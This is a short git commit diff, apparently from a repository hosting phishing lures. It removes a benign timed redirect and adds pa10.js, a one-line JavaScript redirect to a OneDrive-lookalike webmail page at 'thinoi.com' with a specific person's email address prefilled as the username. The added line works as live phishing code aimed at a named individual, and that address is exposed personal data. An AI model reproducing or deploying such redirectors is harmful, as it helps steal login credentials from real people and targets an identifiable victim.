815749e1471e281e9d32332ad195fdc2d3a2c091
cdnsfile <ifechukwunuchukwu2@gmail.com>
2025-07-27 07:02:07 -0700

    Update and rename pa9.js to pa10.js

---
+++ pa10.js
@@ -0,0 +1,1 @@
+ window.location.href = "https://onedrive.thinoi.com/webmail/desk5.html?username=kknibbs@brookgreen.org";
--- pa9.js
+++
@@ -1,3 +0,0 @@
-setTimeout(function () {
-    window.location.href = "https://www.example.com";
-}, 3000); // 3000 milliseconds = 3 seconds
